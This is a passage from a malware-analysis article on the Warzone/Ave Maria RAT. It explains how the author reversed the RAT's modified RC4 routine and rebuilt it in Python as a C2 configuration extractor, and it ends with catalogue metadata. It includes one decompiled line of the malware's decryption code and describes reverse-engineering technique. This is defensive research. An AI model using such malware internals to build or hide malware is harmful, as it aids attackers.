struct_rc4 structure. Additionally, there’s a S array variable too.\n**h.** I used other variable named key to represent the provided key, index variable during the KSA\n\n**phase and data_len variable to represent the length of encrypted data.**\n\n54 | P a g e\n\n\n-----\n\nThe mentioned structure definition (SHIFT+F9) follows below:\n\n**[Figure 70] struct_rc4 definition**\n\nTherefore, we need to do a heavy work on the current code (Figure 67) before proceeding because a good\nmarking is always useful for understanding the code and the big picture. The code of sub_A824BB\n**subroutine, after doing all changes (variable type changes and renaming operations), is the following one:**\n\n55 | P a g e\n\n\n-----\n\n**[Figure 71] sub_A824BB (renamed to ab_RC4) after marking up.**\n\nThe truncated line 54 (previously 49) has the following content:\n\n**data[cypher] ^= sbox_[(p_rc4->y + var_temp)] ^ (sbox_[(var_temp + var_k)] + sbox_[(sbox_[((0x20 ***\n**p_rc4->y) ^ (p_rc4->x >> 3))] + sbox_[((0x20 * p_rc4->x) ^ (p_rc4->y >> 3))]) ^ 0xAA]);**\n\n**[Figure 72] truncated line 54 of sub_A8224BB**\n\nReaders can notice that the code is much better and other details must be commented:\n\n  - The first 24 lines don’t present any news and, basically, the code is initializing the S array with\n\nnumbers from 1 to 256.\n\n  - The line 28 is remarkably similar to the usual KSA phase of a standard RC4, but it introduces an\n\ninteresting number: 250. We’re going to l learn reasons that explains why it’s more relevant than\nyou can imagine.\n\n  - **Lines 30 and 32 represent, initially, the same swap between S arrays of the standard RC4 algorithm.**\n\n  - **Things change from line 43 onward and a list of instructions were introduced when compared to**\n\nRC4.\n\n  - **Line 54 is intrinsically complex and that’s the reason I’ve highlighted it using distinct colors.**\n\n  - **Still on line 54, there’re three interesting points: shl (shift left) and shr (shift right) operations**\n\n(both bring a subtle trap) and an XOR operation with 0xAA, which also presents a subtle detail.\n\n56 | P a g e\n\n\n-----\n\nThe next step is to implement this algorithm in languages such Python, C or Golang, but don’t go so fast.\nMost of the time we use the pseudo code from IDA Pro to implement the C2 configuration extractor and,\nusually, everything works well. Nonetheless, this is not one of these times. Certainly, readers can\nimplement from the pseudo code, but it doesn’t bring the necessary details to do it without running risks.\n\nTherefore, I’ll use the own Assembly code as reference to implement the C2 configuration extractor.\nHowever, another significant issue comes up: this translation is not naturally simple, and readers need to\npay attention to exact Assembly instructions to do it precisely. Additionally, it’s recommended to use a\ndebugger to check your implementation as you’re writing the Python code.\n\nFundamentally, when I need to translate a customized algorithm from Assembly code to another language\nI use a technique informally named “implementation by decomposition”. In other words, I translate the\nminimal amount of Assembly instructions to Python to be able to verify it against a debugger. Of course,\nthe final script is a bit longer than usual, but usually works very well. Probably readers have another\ntechnique to do it, so feel free to follow what’s best for you.\n\nAnother interesting trick is that I always use the Notepad++ to copy every single Assembly code and make\nmy comments there. Why? Because I can highlight a word and all occurrences of it will be highlighted too.\nOf course, we can do comments on IDA Pro too, but in this case I think it’s easier to use Notepad++ to\naccomplish this task.\n\nBefore showing my notes and scripts, we have to remember that key and encrypted data are stored on\n**.bss section. Readers can find this reference to .bss section on subroutine sub_A86A58. Observing the .bss**\nsection (CTRL+S hotkey) readers will find the following data:\n\n**[Figure 73] truncated line 54 of sub_A8224BB**\n\nThe stored data seems to be quite obvious, mainly if readers already analyzed the Warzone RAT previously.\n\n57 | P a g e\n\n\n-----\n\nWe have the following scheme:\n\n  - On line 0x00BD9000 is the key size. In this case, 0x32 = 50 bytes.\n\n  - From line 0x00BD9004 to 0x00BD9035, we have the key.\n\n  - From line 0x00BD9036 to 0xBD90AA we have the encrypted data.\n\nTherefore, it’s quite easy to extract this information from binary using Python. However, there’s a minor\nproblem: we can’t keep the key with only 50 bytes. Why?\n\nDo you remember about the code on page 55 (line 28) when I underscored the existence of the number\n**250? That’s the first catch: the extracted key really has 50 bytes, but you will need an array of 250 bytes**\n**as key. In other words, it will be necessary to expand the array containing the extracted key and complete**\n**it with zeros until reaching 250 bytes!**\n\n**Is it game over? Not even close! Keep reading. After having overcome this catch, implementing the KSA**\n**phase is a bit easier, and readers can also use the pseudo code as reference here to do it because there**\nwon’t be any trap on the way. The real problem come up when we need to implement the PRGA phase.\nWhy? Because you can lose crucial details that are in Assembly code that aren’t so easy to notice on IDA\npseudo code. However, before proceeding, I strongly recommend you check the SBOX’s content soon\nafter the KSA implementation because it must be correct to be used in the PRGA phase. For example, in\nmy case, I implemented a simple routine (printsbox( )), containing few lines of Python code, to print the\nresulting SBOX from KSA phase and make sure you didn’t make any mistake:\n\n**[Figure 74] SBOX S resulting from KSA phase**\n\n58 | P a g e\n\n\n-----\n\nTo help readers to visualize what I did and understand my decisions, I’m leaving my Notepad++ notes here,\nwhich are composed by the transcription of the Assembly code and respective comments on each line. This\nnotes are the most useful information of this section, by far:\n\n**[Figure 75] Commented Assembly code representing the PRGA**\n\nFirst comments about the code above follow:\n\n  - Readers will see variable names such as A, B, C, D, etc. These variables have been used in the final\n\nPython C2 configuration extractor (later).\n\n  - All interpretations have been confirmed by debugging the Python code and also using a debugger.\n\n  - I’ve left the variable’s values on side of each assembly instruction for helping readers to follow the\n\nlogic and, eventually, to be able to check whether you are getting the same results.\n\n59 | P a g e\n\n\n-----\n\n- **movsx instruction always demands attention. Please, remember its description from Intel manual:**\n\n**_“Copies the contents of the source operand (register or memory location) to the destination_**\n**_operand (register) and sign extends the value to 16 or 32 bits. The size of the converted value_**\n**_depends on the operand-size attribute.” (Intel Developer Manual)_**\n\n**[Figure 76] MOVSX instruction: description and table from Intel manual: Intel® 64 and IA-32**\n\n**Architectures Software Developer’s Manual – page 1314**\n\n- Over the code, it’s necessary to pay attention to appearance of negative values. Additionally,\n\ninstructions such as movsx is critical when being used with these negative numbers.\n\n- The SIGNEXT routine (shown in the Python code) handle with issues caused by movsx instruction.\n\nI’ve used the implementation described by Igor Skochinsky, and there’re two references to this\ntopic:\n\n    - [https://stackoverflow.com/questions/9433541/movsx-in-python](https://stackoverflow.com/questions/9433541/movsx-in-python)\n\n    - [http://graphics.stanford.edu/~seander/bithacks.html](http://graphics.stanford.edu/~seander/bithacks.html)\n\n- There are few “mov” instructions that take only a byte (and not a double word) as operand, and we\n\nneed to pay attention to this. For example: mov bl, byte[ecx+edx]\n\n- The rotate instructions (shr and shl) can bring surprises, mainly if reader to consider that arguments\n\ncan be negative.\n\n- According to my experience in writing Python code from Assembly equivalents, it’s always\n\nrecommended to be careful in examining past instructions to keep the same references. That’s one\nof the reasons that doing it in a simple editor like Notepad++ could be useful for getting a good\nunderstanding of the challenge.\n\n- Reading my notes, readers will notice that the line 54 is composed by a considerable list of\n\nAssembly instructions, so I kept this approach in the Python code to make easier to perform any\ncheck just in case was necessary.\n\n- Readers can check their progress by checking the SBOX content of each interaction and confirming\n\nthat the respective values are right. Additionally, a debugger can be used to retrieve a counterproof\nabout it, so might be useful making the same notes as side comments on the assembly lines offered\nby the debugger. An example is shown below:\n\n60 | P a g e\n\n\n-----\n\n**[Figure 77] Commented Assembly code representing the PRGA on OllyDbg**\n\nFinally, the C2 configuration extractor written in Python follows below:\n\n\n61 | P a g e\n\n\n-----\n\n62 | P a g e\n\n\n-----\n\n63 | P a g e\n\n\n-----\n\n**[Figure 78] C2 Extractor Configurator written in Python**\n\n\n64 | P a g e\n\n\n-----\n\nReaders can get a confirmation of this result using a debugger or even a public sandbox like Triage (check\n**Figure 7 on page 8).**\n\nEventually, readers could think it’s easy to translate instructions from Assembly to Python but take care.\nBecause the high-level profile of Python, we should carefully choose the right Python instructions to reflect\nexactly the set of Assembly instructions.\n\nFurther notes follow below:\n\n  - The decryptor itself is composed by the first 118 lines.\n\n  - I kept the printsbox(x) routine in the code to help readers to use it to print a SBOX whether\n\nnecessary.\n\n  - **On line 28, pay attention to the fact I initialized the SBOX with zeros to make sure that everything is**\n\npredictable since beginning.\n\n  - Although I haven’t mentioned the movzx instruction previously when I commented about\n\nAssembly, it has a relevant role when translating to Python language because it also tells us that we\nonly should have concern with the byte portion of a data. According to Intel Developer Manual, its\ndescription is: “Copies the contents of the source operand (register or memory location) to the\n**_destination operand (register) and zero extends the value. The size of the converted value_**\n**_depends on the operand-size attribute.”. Therefore, we have to pay attention to this detail too._**\n\n**[Figure 79] MOVZX instruction: description and table from Intel manual: Intel® 64 and IA-32**\n\n**Architectures Software Developer’s Manual – page 1324**\n\n  - Once again, it’s important to highlight that script could be more compact, but I kept it with more\n\ninstructions to reflect closely the Assembly instructions.\n\n  - In the second part, page 64 / line 46 there’s a small catch: as I had explained previously, I expanded\n\n**the key array to 250 bytes because the original code (in the IDA Pro) expects exactly it.**\n\n  - In various parts of the Python script, I used an equivalent “do while” construction to reflect exactly\n\nwhat’s shown in IDA Pro and Assembly code.\n\n  - If readers face issues during the coding process, print the SBOX to confirm whether the content is\n\nthe expected one.\n\n  - Pay attention to line 102: I used N=0xFFFFFFAA and not 0x000000AA. Ask yourself the reasons.\n\n  - In the main subroutine arguments are the .bss section’s address and expected data size. Of course,\n\nit’s quite trivial to adapt this script to find the start of the .bss section automatically and to accept a\ngiven file path from command line. Please, just in case it’s necessary, check past articles of this\nseries to learn how to do it.\n\n65 | P a g e\n\n\n-----\n\n## 10. Conclusion\n\nI believe this article have left good messages and take aways because even a simple malware like Ave\nMaria / Warzone RAT can present small challenges.\n\nWhen I started this article, I really planned to present an article simpler than any other ones in this series\nso far, but the C2 algorithm unexpectedly demanded a quite effort to construct a reasonable explanation.\n\nPersonally, I like this approach of translating minimum set of Assembly instructions to Python because it’s\ndirect and usually produce effective results with any custom algorithm. Of course, it eventually takes a bit\nmore time to get it done, but it’s worth.\n\nFurthermore, not just in this case, but for every other case where we need to implement a customized\ndecryption algorithm, recommendations are the same:\n\n  - Get a clear understanding of the encryption/decryption algorithm.\n\n  - Ensure you have a good comprehension of involved Assembly instructions.\n\nDifferently from most cases which we are able to write C2 decryptors by only analyze pseudo code on IDA\nPro, this article showed a situation that using the Assembly code produced more reliable results without\nrunning risks in try and error attempts because Assembly offers us the exact information that we need to\ntranslate instructions to Python. Better: works for any case.\n\nThere’s another thing I’d like to comment: reversing codes (and, in this case, malware threats) takes time\nand demands patience. As readers already know, one scenario is running the malware sample in a sandbox\n/ virtual machine and getting the important results. Other quite different scenario is reversing a malware\nsample in detail, which also demands different knowledge from areas such as cryptography, Windows\ninternals and, no doubts, programming, which help and level-up reverse engineers’ skills so much.\n\nThis article certainly will have typos and errors, but it isn’t big deal. Soon I find them, I’ll release a new\nrevision of this document.\n\nRecently a professional (Twitter: _@bushuo12) translated the three first articles of this series to Chinese_\nand, just in case you’re able to understand the language, Chinese versions follow below:\n\n  - **[(MAS): Article 1 -- https://www.yuque.com/docs/share/619f03dc-1bc9-42f7-828e-fc17d82786e7](https://www.yuque.com/docs/share/619f03dc-1bc9-42f7-828e-fc17d82786e7)**\n\n  - **[(MAS) : Article 2 -- https://www.yuque.com/docs/share/d16efbd6-e2e6-4325-9b9e-23c613bd2280](https://www.yuque.com/docs/share/d16efbd6-e2e6-4325-9b9e-23c613bd2280)**\n\n  - **[(MAS) : Article 3 -- https://www.yuque.com/docs/share/7dca2583-8456-4ca5-8862-0524fc6faaf9](https://www.yuque.com/docs/share/7dca2583-8456-4ca5-8862-0524fc6faaf9)**\n\nJust in case you want to keep in touch:\n\n  - **Twitter:** **@ale_sp_brazil**\n\n  - **Blog:** [https://exploitreversing.com](https://exploitreversing.com/)\n\nKeep reversing and I see you at next time!\n\n**Alexandre Borges**\n\n66 | P a g e\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        },
        {
            "id": "4e039bf8-7239-4999-8ec0-eb202d1465af",
            "created_at": "2022-12-04T11:19:36.52593Z",
            "updated_at": "2022-12-04T11:19:36.52593Z",
            "deleted_at": null,
            "name": "ORKL",
            "url": "https://github.com/ORKL/library",
            "description": "ORKL Community Contributed Content",
            "reports": null
        }
    ],
    "references": [
        "https://exploitreversing.files.wordpress.com/2022/11/mas_6-1.pdf"
    ],
    "report_names": [
        "mas_6-1.pdf"
    ],
    "threat_actors": [
        {
            "id": "b01b0683-5c7c-4070-ba0c-4fdede370995",
            "created_at": "2022-10-25T16:07:23.925692Z",
            "updated_at": "2025-03-27T02:02:10.03376Z",
            "deleted_at": null,
            "main_name": "Operation Armor Piercer",
            "aliases": [],
            "source_name": "ETDA:Operation Armor Piercer",
            "tools": [
                "NetWeird",
                "NetWire",
                "NetWire RAT",
                "NetWire RC",
                "NetWired RC",
                "Recam",
                "Warzone",
                "Warzone RAT"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1669431208,
    "ts_updated_at": 1743041834,
    "ts_creation_date": 1669295358,
    "ts_modification_date": 1669295358,
    "files": {
        "pdf": "https://archive.orkl.eu/99411dadc52675d3d86e217564ae8bb7b900754f.pdf",
        "text": "https://archive.orkl.eu/99411dadc52675d3d86e217564ae8bb7b900754f.txt",
        "img": "https://archive.orkl.eu/99411dadc52675d3d86e217564ae8bb7b900754f.jpg"
    }
}